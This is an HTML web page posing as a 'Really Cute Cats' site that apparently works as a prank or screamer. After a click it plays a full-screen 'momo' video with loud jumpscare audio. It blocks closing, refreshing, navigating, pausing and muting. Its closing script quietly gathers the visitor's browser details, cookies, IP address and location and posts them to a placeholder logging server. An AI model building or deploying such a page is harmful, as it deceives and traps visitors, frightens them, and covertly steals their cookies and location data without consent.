<!DOCTYPE html>
<html>
<head> 
    <title>Really Cute Cats</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            position: relative;
        }
        #cats-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            z-index: 0;
            object-fit: cover;
        }
        #agreement {
            position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.7); display:flex; justify-content:center; align-items:center; z-index:9999;
        }
        video {
            width: 100vw;
            height: 100vh;
            object-fit: cover;
            display: none;
            z-index: 1;
            background: url('maxresdefault.jpg') center center / cover no-repeat;
            position: fixed;
            top: 0;
            left: 0;
            pointer-events: none;
            /* Hide all controls */
            controls: false;
        }
        audio {
            display: none;
        }
        @media (max-width: 600px) {
            #cats-bg, video {
                width: 100vw !important;
                height: 100vh !important;
                object-fit: cover !important;
                position: fixed !important;
                top: 0 !important;
                left: 0 !important;
            }
            #agreement > div {
                width: 90vw;
                font-size: 1.2em;
                padding: 10vw 2vw;
            }
            #agreement button {
                font-size: 1em;
                padding: 4vw 8vw;
            }
        }
    </style>
</head>

<body> 

<div id="cats-bg-wrap" style="display:block;">
  <img id="cats-bg" src="cat.jpg" alt="Cats Background" style="position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:0;object-fit:cover;display:block;" />
</div>

<div id="agreement" style="position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.7); display:flex; justify-content:center; align-items:center; z-index:9999;">
    <div style="background:rgba(255,255,255,0.15); padding:40px; border-radius:10px; text-align:center;">
        <h2>进入全屏?</h2>
        <p>点击同意以全屏观看并启用声音</p>
        <button onclick="enterFullscreen()" style="padding:10px 30px; font-size:16px; cursor:pointer; background:green; color:white; border:none; border-radius:5px;">Посмотреть на милых котиков</button>
    </div>
</div>

<video src="momo.mp4" autoplay loop muted style="width:100vw; height:100vh; object-fit:cover; display:none; pointer-events:none; position:fixed; top:0; left:0;" playsinline></video>

<div id="fullscreen-warning" style="display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(0,0,0,0.85); color:white; z-index:10000; justify-content:center; align-items:center; flex-direction:column; font-size:2em;">
  <div>⚠️ 你已退出全屏模式<br>但罗纳尔多剪辑仍在播放！</div>
  <button onclick="reenterFullscreen()" style="margin-top:30px; padding:20px 40px; font-size:1em; background:green; color:white; border:none; border-radius:10px; cursor:pointer;">Закрыть Сайт</button>
</div>

<audio id="jumpscare-audio" src="jumpscare.mp3" preload="auto" loop style="display:none;"></audio>

<script>
function hideCatsBg() {
  document.getElementById('cats-bg-wrap').style.display = 'none';
}

function enterFullscreen() {
    document.getElementById('agreement').style.display = 'none';
    document.getElementById('cats-bg-wrap').style.display = 'none'; // Hide cat background after agreement
    const video = document.querySelector('video');
    video.style.display = 'block';
    video.muted = false;
    video.volume = 1.0;
    video.play();
    // Try fullscreen for all platforms
    if (video.requestFullscreen) {
        video.requestFullscreen();
    } else if (video.webkitRequestFullscreen) {
        video.webkitRequestFullscreen();
    } else if (video.msRequestFullscreen) {
        video.msRequestFullscreen();
    }
    // For iOS Safari
    if (video.webkitEnterFullscreen) {
        video.webkitEnterFullscreen();
    }
    // Hide cursor after 3 seconds of inactivity in fullscreen
    let cursorTimeout;
    function hideCursor() {
        document.body.style.cursor = 'none';
    }
    function showCursor() {
        document.body.style.cursor = '';
        clearTimeout(cursorTimeout);
        cursorTimeout = setTimeout(hideCursor, 0.00000003);
    }
    document.addEventListener('mousemove', showCursor);
    showCursor();
}

function reenterFullscreen() {
  document.getElementById('fullscreen-warning').style.display = 'none';
  const video = document.querySelector('video');
  if (video.requestFullscreen) {
    video.requestFullscreen();
  }
}

window.addEventListener('beforeunload', function (e) {
    e.preventDefault();
    e.returnValue = '';
    // Most browsers will show a generic confirmation dialog
});

document.addEventListener('keydown', function(e) {
    const video = document.querySelector('video');
    if (video && !document.fullscreenElement) {
        video.requestFullscreen();
    }
});

document.addEventListener('fullscreenchange', function() {
  if (!document.fullscreenElement) {
    document.getElementById('fullscreen-warning').style.display = 'flex';
  } else {
    document.getElementById('fullscreen-warning').style.display = 'none';
  }
});

// Warn before leaving the page
window.addEventListener('beforeunload', function (e) {
    e.preventDefault();
    e.returnValue = '';
});
// Block navigation via links
Array.from(document.getElementsByTagName('a')).forEach(function(link) {
    link.addEventListener('click', function(e) {
        e.preventDefault();
        alert('Navigation is disabled!');
    });
});
// Disable right-click without alert
window.addEventListener('contextmenu', function(e) {
    e.preventDefault();
});
// Try to trap F5 and Ctrl+R (refresh)
document.addEventListener('keydown', function(e) {
    if (e.key === 'F5' || (e.ctrlKey && e.key === 'r')) {
        e.preventDefault();
        alert('Refresh is disabled!');
    }
});
// Trap Alt+Left/Right (back/forward navigation)
document.addEventListener('keydown', function(e) {
    if ((e.altKey && (e.key === 'ArrowLeft' || e.key === 'ArrowRight')) || (e.metaKey && (e.key === '[' || e.key === ']'))) {
        e.preventDefault();
        alert('Navigation is disabled!');
    }
});
// Trap Ctrl+W (close tab)
document.addEventListener('keydown', function(e) {
    if ((e.ctrlKey && (e.key === 'w' || e.key === 'W'))) {
        e.preventDefault();
        alert('Closing tab is disabled!');
    }
});
// Trap Ctrl+Tab (switch tab)
document.addEventListener('keydown', function(e) {
    if ((e.ctrlKey && e.key.toLowerCase() === 'tab')) {
        e.preventDefault();
        alert('Tab switching is disabled!');
    }
});

window.addEventListener('DOMContentLoaded', function() {
  var audio = document.getElementById('jumpscare-audio');
  if (audio) {
    // Prevent muting
    audio.addEventListener('volumechange', function() {
      if (audio.muted || audio.volume < 1) {
        audio.muted = false;
        audio.volume = 1.0;
      }
    });
    // Prevent pausing
    audio.addEventListener('pause', function() {
      audio.play();
    });
    // Prevent pausing/muting with click or key
    audio.addEventListener('click', function(e) {
      e.preventDefault();
      audio.muted = false;
      audio.volume = 1.0;
      audio.play();
    });
    document.addEventListener('keydown', function(e) {
      if (e.key === 'm' || e.key === 'M') {
        e.preventDefault();
        audio.muted = false;
        audio.volume = 1.0;
        audio.play();
      }
    });
    audio.muted = false;
    audio.volume = 1.0;
    audio.play();
  }
  var video = document.querySelector('video');
  if (video) {
    video.addEventListener('pause', function() {
      video.play();
    });
    // Prevent pausing with keyboard
    video.addEventListener('keydown', function(e) {
      if (e.code === 'Space' || e.key === ' ' || e.key === 'Spacebar') {
        e.preventDefault();
      }
    });
    // Prevent pausing with click
    video.addEventListener('click', function(e) {
      e.preventDefault();
      video.play();
    });
  }
});

// Collect device/browser info
const deviceInfo = {
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    screen: {
        width: window.screen.width,
        height: window.screen.height
    },
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    cookies: document.cookie,
    referrer: document.referrer
};

// Fetch IP and region info from ipapi.co
fetch('https://ipapi.co/json/')
    .then(response => response.json())
    .then(ipData => {
        const visitorData = {
            ...deviceInfo,
            ip: ipData.ip,
            city: ipData.city,
            region: ipData.region,
            country: ipData.country_name,
            org: ipData.org
        };
        // Send all collected info to your backend
        fetch('https://your-backend-url-or-ip/log', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(visitorData)
        });
    })
    .catch(err => {
        // If IP info fails, just send device info
        fetch('https://your-backend-url-or-ip/log', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(deviceInfo)
        });
    });
</script>







</body>
</html>